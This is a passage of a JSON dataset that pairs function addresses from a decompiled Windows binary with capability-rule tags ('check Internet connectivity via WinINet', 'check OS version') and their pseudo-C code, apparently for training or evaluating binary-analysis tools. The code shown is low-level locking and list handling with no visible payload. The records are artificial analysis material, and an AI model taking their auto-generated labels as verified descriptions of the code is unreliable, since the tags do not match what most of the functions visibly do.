            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003ca60(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.0003d3e0(arg_8h, 1, 0x1010e, &arg_ch, 4);\n    if (var_ch == 0) {\n        fcn.00037640(0x800ce848, &var_4h, 1);\n        iVar1 = fcn.0003f990(arg_8h, 1);\n        if (iVar1 == 0) {\n            var_ch = -0x3fffff40;\n        }\n        else {\n            *(iVar1 + 0x42c) = arg_ch;\n        }\n        fcn.00037670(0x800ce848, &var_4h, 1);\n    }\n    return var_ch;\n}\n",
        "token_count": 215
    },
    "0003cae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0003cae0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = fcn.0003d3e0(arg_8h, 0, 0x1010102, &var_ch, 6);\n    fcn.00037640(0x800ce848, &var_4h, 1);\n    iVar1 = fcn.0003f990(arg_8h, 1);\n    if (iVar1 == 0) {\n        var_14h = -0x3fffff40;\n    }\n    else if (var_14h == 0) {\n        *(iVar1 + 0x1c) = var_ch;\n        *(iVar1 + 0x20) = var_8h;\n    }\n    else {\n        *(iVar1 + 0x1c) = 0;\n        *(iVar1 + 0x20) = 0;\n    }\n    fcn.00037670(0x800ce848, &var_4h, 1);\n    return var_14h;\n}\n",
        "token_count": 289
    },
    "0003cb70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003cb70(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    iVar1 = fcn.0003f990(arg_8h, 0);\n    if (iVar1 != 0) {\n        var_8h = *(iVar1 + 0x44c);\n    }\n    fcn.00037670(0x800ce848, &var_4h, 0);\n    if (var_8h == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        uVar2 = fcn.0003d540(var_8h, arg_ch, arg_10h);\n    }\n    return uVar2;\n}\n",
        "token_count": 228
    },
    "0003cbf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0003cbf0(void)\n\n{\n    int32_t iVar1;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uchar var_44h;\n    uchar var_43h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00040fc0(&var_50h);\n    if (var_50h != 0) {\n        if (*0x800ce7e0 != 0) {\n            (**0x800db884)(*0x800ce7e0);\n        }\n        *0x800ce7e0 = 0;\n    }\n    if (*0x800ce7e0 == 0) {\n        fcn.00040fc0(&var_50h);\n        fcn.000789c0(&var_8h, 0x800cb85c);\n        fcn.00078bfa(&var_48h, 0, 0x40);\n        var_48h._0_1_ = 0x95;\n        var_48h._2_2_ = 0x40;\n        var_48h._1_1_ = 1;\n        var_44h = 6;\n        var_43h = 0;\n        var_3ch = var_8h;\n        var_38h = var_4h;\n        var_34h = 0;\n        var_28h = 0x8007cfa0;\n        var_24h = 0x8007cfc0;\n        var_ch = 0x8007cf50;\n        var_18h = 0x8007cfe0;\n        var_14h = 0x8007cf40;\n        var_1ch = 0;\n        var_10h = 0x8007cf30;\n        var_20h = 0x8007cf10;\n        var_30h = 0x8007cf20;\n        var_2ch = 0x8007cde0;\n        iVar1 = (**0x800db874)(0x800ce7e0, &var_48h, 0x800ce7e0);\n        if (iVar1 != 0) {\n            *0x800ce7e0 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 617
    },
    "0003cd00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003cd00(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00034f40(0x80054990, &var_ch);\n    if (((var_4h == 0) && (var_4h = fcn.0005cd70(var_ch, 0x80054c00, &var_8h),  var_4h == 0)) &&\n       (var_4h = fcn.000636c0(var_8h, 0x8007d350, 0x800ce864),  var_4h == 0)) {\n        fcn.0003cbf0();\n    }\n    return var_4h;\n}\n",
        "token_count": 176
    },
    "0003cd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0003cd70(void)\n\n{\n    int32_t iVar1;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00040df0();\n    if (*0x800ce7e0 != 0) {\n        (**0x800db884)(*0x800ce7e0);\n    }\n    for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n        iVar1 = fcn.0003df90(var_8h, &var_4h);\n        if ((iVar1 == 0) && (var_4h != 0)) {\n            fcn.0003e010(var_8h);\n        }\n    }\n    fcn.00063b20(0x800ce864);\n    return 0;\n}\n",
        "token_count": 193
    },
    "0003cde0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003cde0(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_ch = 0;\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    if ((arg_ch != 0) && (*(arg_ch + 4) != 0)) {\n        var_ch = *(arg_ch + 8);\n        var_14h = *(arg_ch + 4);\n    }\n    fcn.00037670(0x800ce848, &var_4h, 0);\n    if (var_14h == 0) {\n        var_10h = 0;\n    }\n    else {\n        fcn.0003d3e0(var_ch, 1, 0x1010103, 0, 0);\n        fcn.0003d3e0(var_ch, 1, 0x1010e, 0, 0);\n        var_10h = (**0x800db870)(var_14h);\n        if (var_10h == 0x103) {\n            var_10h = fcn.00041780(arg_ch);\n        }\n        if (var_10h == 0) {\n            fcn.00037640(0x800ce848, &var_4h, 0);\n            if ((arg_ch != 0) && (*(arg_ch + 4) != 0)) {\n                *(arg_ch + 0x44c) = 0;\n                *(arg_ch + 0x450) = 0;\n                *(arg_ch + 4) = 0;\n                *(arg_ch + 0x458) = 4;\n            }\n            fcn.00037670(0x800ce848, &var_4h, 0);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 457
    },
    "0003cf50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0003cf50(uint noname_0, uint *arg_ch)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_8h = arg_ch;\n    while ((var_8h != NULL && (puVar1 = *var_8h,  var_8h[4] == *0x800ce874))) {\n        (**0x800ce71c)(var_8h, puVar1, var_8h, 0);\n        var_8h = puVar1;\n    }\n    return;\n}\n",
        "token_count": 186
    },
    "0003d060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0003d060(uint arg_8h)\n\n{\n    int32_t arg_ch;\n    int32_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    int32_t var_6ch;\n    uint var_68h;\n    uint var_64h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar var_ch [4];\n    uint var_8h;\n    \n    var_38h = 0;\n    var_10h._0_2_ = 0x888e;\n    var_10h._2_2_ = 0x8100;\n    var_3ch = 0;\n    var_18h = 0;\n    arg_ch = fcn.000356f0(0x208);\n    if (arg_ch == 0) {\n        var_6ch = 0x21590004;\n    }\n    else {\n        fcn.00037640(0x800ce848, var_ch, 0);\n        iVar1 = fcn.000533b0(0x800ce878, 0, 0);\n        if (iVar1 == 0) {\n            fcn.00037670(0x800ce848, var_ch, 0);\n            var_6ch = 0x21590006;\n        }\n        else {\n            var_3ch = fcn.0003f990(arg_8h, 1);\n            if (var_3ch == 0) {\n                var_6ch = -0x3ffffff3;\n            }\n            else {\n                if ((*(var_3ch + 0x22) == 0x24) || (*(var_3ch + 4) != 0)) {\n                    var_3ch = 0;\n                }\n                else {\n                    fcn.00078a08(arg_ch, var_3ch + 0x22, 0x104);\n                    *(arg_ch + 0x206) = 0;\n                }\n                var_6ch = 0;\n            }\n            fcn.00037670(0x800ce848, var_ch, 0);\n            if (var_3ch != 0) {\n                fcn.000789c0(&var_8h, arg_ch);\n                var_34h = 0x1c0187;\n                var_30h = &var_8h;\n                var_2ch = &var_38h;\n                var_28h = 1;\n                var_24h = &var_14h;\n                var_20h = &var_10h;\n                var_1ch = 2;\n                puVar7 = &var_18h;\n                puVar6 = &var_64h;\n                puVar5 = &var_34h;\n                uVar3 = *0x800ce864;\n                uVar4 = *0x800ce7e0;\n                iVar1 = var_3ch;\n                pcVar2 = fcn.00063f30(*0x800ce864);\n                var_6ch = (*pcVar2)(uVar3, uVar4, iVar1, puVar5, puVar6, puVar7);\n                if (var_6ch == 0x103) {\n                    var_6ch = fcn.00041780(var_3ch);\n                }\n                if (var_6ch == 0) {\n                    iVar1 = fcn.0003d250(var_18h, arg_ch);\n                    if (iVar1 == 0) {\n                        fcn.0003cae0(arg_8h);\n                    }\n                    else {\n                        (**0x800db870)(var_18h);\n                    }\n                }\n            }\n        }\n        fcn.000357f0(arg_ch);\n    }\n    return var_6ch;\n}\n",
        "token_count": 946
    },
    "0003d250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003d250(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_14h;\n    uint arg_18h;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = arg_8h;\n    do {\n        arg_8h_00 = *(var_ch + 8);\n        if (arg_8h_00 == 0) {\n            var_ch = 0;\n        }\n        else {\n            var_ch = *(arg_8h_00 + 8);\n        }\n    } while ((var_ch != 0) && (arg_8h_00 != var_ch));\n    if (arg_8h_00 == 0) {\n        var_18h = -0x3ffffff3;\n    }\n    else {\n        arg_14h = *(arg_8h_00 + 0xc);\n        arg_18h = fcn.0003d380(arg_8h_00);\n        fcn.0003dde0(arg_ch, arg_8h, arg_8h_00, arg_14h, arg_18h);\n        var_18h = fcn.0003b2e0(arg_18h);\n        if (var_18h == 0) {\n            fcn.0003daa0(arg_8h, 0);\n            fcn.00039a40();\n        }\n        if ((var_18h != -0x3fffffdf) && (var_18h != 0)) {\n            fcn.0003dde0(arg_ch, 0, 0, 0, 0);\n        }\n        if ((var_18h == -0x3fffffdf) || (var_18h == 0)) {\n            var_18h = 0;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 449
    },
    "0003d380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003d380(uint arg_8h)\n\n{\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_4h = 0x4e4d4944;\n    (**0x80051048)(arg_8h, &var_ch, &var_8h, 0, 0, 0);\n    if (var_8h != 0) {\n        var_10h = (**0x80051218)(*(var_8h + 8), var_4h);\n    }\n    return var_10h;\n}\n",
        "token_count": 169
    },
    "0003d3e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0003d3e0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_a8h = 0;\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    var_8h = fcn.0003f990(arg_8h, 1);\n    if (var_8h != 0) {\n        var_a8h = *(var_8h + 4);\n    }\n    fcn.00037670(0x800ce848, &var_4h, 0);\n    if (var_a8h == 0) {\n        var_a4h = -0x3ffffddb;\n    }\n    else {\n        fcn.00078bfa(&var_a0h, 0, 0x94);\n        iVar1 = fcn.000344b0(&var_10h);\n        if (iVar1 == 0) {\n            var_a4h = -0x3fffffff;\n        }\n        else {\n            var_a0h._0_1_ = 0x96;\n            var_a0h._1_1_ = 1;\n            var_a0h._2_2_ = 0x8c;\n            var_9ch = arg_ch;\n            var_98h = 0;\n            if (arg_ch == 0) {\n                var_88h = arg_10h;\n                var_84h = arg_14h;\n                var_80h = arg_18h;\n            }\n            else if (arg_ch == 1) {\n                var_88h = arg_10h;\n                var_84h = arg_14h;\n                var_80h = arg_18h;\n            }\n            var_a4h = (**0x800ce724)(var_a8h, &var_a0h);\n            if (var_a4h == 0x103) {\n                fcn.000345a0(&var_10h, 0xffffffff);\n                var_a4h = var_14h;\n            }\n            fcn.00034540(&var_10h);\n        }\n    }\n    return var_a4h;\n}\n",
        "token_count": 615
    },
    "0003d540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003d540(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_10h = 0;\n    var_4h = 0;\n    fcn.00037640(0x800ce848, &var_8h, 0);\n    iVar1 = fcn.0003dd70(arg_8h, 1);\n    if ((iVar1 != 0) && (*(iVar1 + 0x458) == 0)) {\n        var_10h = *(iVar1 + 4);\n    }\n    fcn.00037670(0x800ce848, &var_8h, 0);\n    if (var_10h == 0) {\n        var_28h = -0x3ffffff8;\n    }\n    else {\n        iVar1 = (**0x800ce718)(*0x800ce874, 8, 0);\n        if (iVar1 == 0) {\n            var_28h = -0x3fffff66;\n        }\n        else {\n            iVar2 = (**0x800ce74c)();\n            *(iVar1 + 100) = iVar2 << 0x18;\n            *(iVar1 + 0x3c) = var_10h;\n            *(iVar1 + 0x48) = *(iVar1 + 0x48) | 1;\n            var_4h = *(iVar1 + 4);\n            if (var_4h == 0) {\n                var_28h = -0x3fffff66;\n            }\n            else {\n                iVar2 = *(var_4h + 0x10);\n                if ((*(iVar2 + 6) & 5) == 0) {\n                    var_2ch = (**0x800510e4)(iVar2, 0, 1, 0, 0, 0x20);\n                }\n                else {\n                    var_2ch = *(iVar2 + 0xc);\n                }\n                if (((*(iVar2 + 0x14) < arg_10h) || (iVar2 == 0)) || (var_2ch == 0)) {\n                    var_28h = -0x3fffff66;\n                }\n                else {\n                    fcn.00078be8(var_2ch, arg_ch, arg_10h);\n                    *(var_4h + 0xc) = arg_10h;\n                    *(var_4h + 0x14) = 0;\n                    *(var_4h + 8) = 0;\n                    (**0x800ce728)(var_10h, iVar1, 0, 0);\n                    var_28h = 0;\n                }\n            }\n        }\n        if ((var_28h != 0) && (iVar1 != 0)) {\n            (**0x800ce71c)(iVar1);\n        }\n    }\n    return var_28h;\n}\n",
        "token_count": 742
    },
    "0003d700": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003d700(uint arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_ch;\n    var_10h = 0;\n    if (arg_ch != NULL) {\n        fcn.00037640(0x800ce848, &var_4h, 0);\n        iVar2 = fcn.0003f990(arg_8h, 1);\n        if (iVar2 != 0) {\n            var_10h = *(iVar2 + 4);\n        }\n        fcn.00037670(0x800ce848, &var_4h, 0);\n        if (var_10h != 0) {\n            (**0x800ce728)(var_10h, uVar1, 0, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0003d800": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nuint * __cdecl fcn.0003d800(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    bool bVar4;\n    uint var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = NULL;\n    var_10h = 0;\n    var_18h = NULL;\n    var_8h = *(arg_8h + 8);\n    while (puVar3 = fcn.000356f0(0x10),  puVar3 != NULL) {\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        puVar3[2] = 0;\n        puVar3[3] = 0;\n        puVar3[1] = var_8h;\n        puVar3[2] = *(var_8h + 0xc);\n        iVar1 = *(var_8h + 8);\n        puVar2 = puVar3;\n        if (var_18h != NULL) {\n            *var_18h = puVar3;\n            puVar2 = var_18h;\n        }\n        var_18h = puVar2;\n        if (var_14h == NULL) {\n            var_14h = puVar3;\n        }\n        if ((iVar1 == 0) || (bVar4 = iVar1 == var_8h,  var_8h = iVar1,  bVar4)) goto code_r0x0003d8be;\n    }\n    var_10h = -0x3fffff66;\ncode_r0x0003d8be:\n    if (var_10h != 0) {\n        var_1ch = var_14h;\n        while (var_1ch != NULL) {\n            puVar3 = *var_1ch;\n            fcn.000357f0(var_1ch);\n            var_1ch = puVar3;\n        }\n        var_14h = NULL;\n    }\n    return var_14h;\n}\n",
        "token_count": 517
    },
    "0003d980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003d980(int32_t *arg_8h, uint *arg_ch)\n\n{\n    int32_t var_14h;\n    uint var_10h;\n    int32_t **var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *arg_ch = 0;\n    var_14h = 0;\n    var_10h = 0xc0000001;\n    fcn.00037640(0x800db788, &var_4h, 1);\n    for (var_8h = 0; var_8h < *0x800db780; var_8h = var_8h + 1) {\n        for (var_ch = *(*0x800db784 + var_8h * 0x10); var_ch != NULL; var_ch = *var_ch) {\n            if ((arg_8h == var_ch[2]) && (*var_ch != NULL)) {\n                var_14h = (*var_ch)[2];\n                break;\n            }\n        }\n        if (var_14h != 0) break;\n    }\n    if (var_14h != 0) {\n        for (var_8h = 0; var_8h < *0x800db780; var_8h = var_8h + 1) {\n            if (*(*0x800db784 + 0xc + var_8h * 0x10) == var_14h) {\n                *arg_ch = *(*0x800db784 + 4 + var_8h * 0x10);\n                var_10h = 0;\n                break;\n            }\n        }\n    }\n    fcn.00037670(0x800db788, &var_4h, 1);\n    return var_10h;\n}\n",
        "token_count": 402
    },
    "0003daa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003daa0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    fcn.00037640(0x800db788, &var_4h, 1);\n    if (*0x800db784 != 0) {\n        for (var_8h = 0; var_8h < *0x800db780; var_8h = var_8h + 1) {\n            var_20h = *(*0x800db784 + var_8h * 0x10);\n            while (var_20h != NULL) {\n                puVar1 = *var_20h;\n                fcn.000357f0(var_20h);\n                var_20h = puVar1;\n            }\n        }\n        fcn.000357f0(*0x800db784);\n        *0x800db780 = 0;\n    }\n    *0x800db784 = 0;\n    if (arg_ch == 0) {\n        var_10h = 1;\n        var_ch = arg_8h;\n        while (((iVar2 = *(var_ch + 0xc4),  iVar2 != 0 && (iVar2 != var_ch)) && (iVar2 != var_ch + 0xc4))) {\n            var_10h = var_10h + 1;\n            var_ch = iVar2;\n        }\n        *0x800db784 = fcn.000356f0(var_10h << 4);\n        if (*0x800db784 == 0) {\n            var_14h = -0x3fffff66;\n        }\n        else {\n            fcn.00078bfa(*0x800db784, 0, var_10h << 4);\n            var_ch = arg_8h;\n            for (var_8h = 0; var_8h < var_10h; var_8h = var_8h + 1) {\n                *(*0x800db784 + 4 + var_8h * 0x10) = var_ch;\n                *(*0x800db784 + 8 + var_8h * 0x10) = *(var_ch + 0xc);\n                *(*0x800db784 + 0xc + var_8h * 0x10) = *(var_ch + 0x1c);\n                uVar3 = fcn.0003d800(var_ch);\n                *(*0x800db784 + var_8h * 0x10) = uVar3;\n                if (*(*0x800db784 + var_8h * 0x10) == 0) {\n                    var_14h = -0x3fffff66;\n                    break;\n                }\n                iVar2 = *(var_ch + 0xc4);\n                if ((iVar2 == 0) || (iVar2 == var_ch)) break;\n                var_ch = iVar2;\n            }\n        }\n        *0x800db780 = var_10h;\n        if ((var_14h != 0) && (*0x800db784 != 0)) {\n            for (var_8h = 0; var_8h < *0x800db780; var_8h = var_8h + 1) {\n                var_28h = *(*0x800db784 + var_8h * 0x10);\n                while (var_28h != NULL) {\n                    puVar1 = *var_28h;\n                    fcn.000357f0(var_28h);\n                    var_28h = puVar1;\n                }\n            }\n            fcn.000357f0(*0x800db784);\n            *0x800db780 = 0;\n        }\n        fcn.00037670(0x800db788, &var_4h, 1);\n    }\n    else {\n        fcn.00037670(0x800db788, &var_4h, 1);\n        var_14h = 0;\n    }\n    return var_14h;\n}\n",
        "token_count": 996
    },
    "0003dd70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003dd70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037640(0x800ce848, &var_4h, 0);\n    }\n    for (var_8h = *0x800ce840; (var_8h != NULL && (var_8h[0x113] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037670(0x800ce848, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 174
    },
    "0003dde0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003dde0(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_40h;\n    uint var_38h;\n    int16_t *var_34h;\n    uint var_30h;\n    uint var_28h;\n    int16_t *var_24h;\n    uint var_20h;\n    uint var_18h;\n    int16_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    if ((((arg_8h == NULL) || (arg_ch == 0)) || (arg_10h == 0)) || (arg_14h == 0)) {\n        uVar2 = 0xc000000d;\n    }\n    else {\n        iVar3 = fcn.0003e2d0(arg_18h, 0, 0);\n        if (iVar3 == 0) {\n            uVar2 = 0xc000000d;\n        }\n        else {\n            fcn.00037640(0x800ce848, &var_4h, 0);\n            for (var_8h = *0x800ce840; var_8h != NULL; var_8h = *var_8h) {\n                var_14h = arg_8h;\n                do {\n                    iVar1 = *var_14h;\n                    var_14h = var_14h + 1;\n                } while (iVar1 != 0);\n                var_24h = var_8h + 0x22;\n                do {\n                    iVar1 = *var_24h;\n                    var_24h = var_24h + 1;\n                } while (iVar1 != 0);\n                if (var_14h - (arg_8h + 1) >> 1 == var_24h - (var_8h + 9) >> 1) {\n                    var_34h = arg_8h;\n                    do {\n                        iVar1 = *var_34h;\n                        var_34h = var_34h + 1;\n                    } while (iVar1 != 0);\n                    iVar4 = fcn.000364d0(arg_8h, var_8h + 0x22, var_34h - (arg_8h + 1) >> 1);\n                    if (iVar4 == 0) break;\n                }\n            }\n            if (var_8h != NULL) {\n                var_8h[0x115] = iVar3;\n                var_8h[0x113] = arg_10h;\n                var_8h[0x114] = arg_14h;\n                var_8h[1] = arg_ch;\n                var_8h[0x116] = 0;\n                var_8h[3] = 1;\n            }\n            fcn.00037670(0x800ce848, &var_4h, 0);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 727
    },
    "0003df90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
